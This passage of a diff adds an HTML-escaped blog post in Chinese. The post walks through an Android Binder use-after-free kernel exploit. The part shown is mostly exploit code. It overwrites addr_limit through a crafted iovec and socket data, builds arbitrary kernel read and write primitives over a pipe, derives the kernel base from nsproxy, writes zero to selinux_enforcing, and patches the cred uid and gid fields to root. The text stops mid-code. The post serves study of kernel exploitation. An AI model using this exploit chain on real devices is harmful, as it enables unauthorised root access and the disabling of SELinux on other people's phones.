+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里就要将addr_limit的值改为&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>在arm64里有个检查函数&lt;code>do_page_fault&lt;/code>会检测该值是否为&lt;code>0xFFFFFFFFFFFFFFFF&lt;/code>，如果是就触发奔溃，所以一般都设为&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>。&lt;/p>
+&lt;p>前面是从内核读出数据，这里要实现的是向内核写入数据。&lt;/p>
+&lt;p>看看这里的iovecStack结构：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x42424242&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>和前面泄露信息的布局是差不多。&lt;/p>
+&lt;p>首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用&lt;code>recvmsg&lt;/code>系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。&lt;/p>
+&lt;p>子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX].iov_len
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint64_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OFFSET_TASK_STRUCT_ADDR_LIMIT&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFE&lt;/span> &lt;span class="c1">// addr_limit value
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>对应上面的值。&lt;/p>
+&lt;p>到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。&lt;/p>
+&lt;h4 id="bypass-kaslr-and-disabling-selinux">bypass kaslr and Disabling SELinux&lt;/h4>
+&lt;p>前面已经了有了完整的读写权限，那这就很简单了。&lt;/p>
+&lt;p>任意读写的实现：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C" data-lang="C">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">kRead&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">uBuffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data from kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">uBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to read data from kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">kWrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">uBuffer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">uBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data from user: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m_kernel_rw_pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[-] Failed to write data to kernel: %p&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Address&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。&lt;/p>
+&lt;p>task_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ptrdiff_t&lt;/span> &lt;span class="n">kernelBase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">nsProxy&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">SYMBOL_OFFSET_init_nsproxy&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">auto&lt;/span> &lt;span class="n">selinuxEnforcing&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">kernelBase&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">SYMBOL_OFFSET_selinux_enforcing&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] nsproxy: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nsProxy&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Kernel base: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">kernelBase&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux_enforcing: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">selinuxEnabled&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">kReadDword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">selinuxEnabled&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux enforcing is disabled&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux enforcing is enabled&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。&lt;/p>
+&lt;p>现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行&lt;/p>
+&lt;h4 id="root">Root&lt;/h4>
+&lt;p>提权的常用语句&lt;code>commit_creds(prepare_kernel_cred(NULL));&lt;/code>，这就是常规的套路了。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">gid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">suid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sgid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">euid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
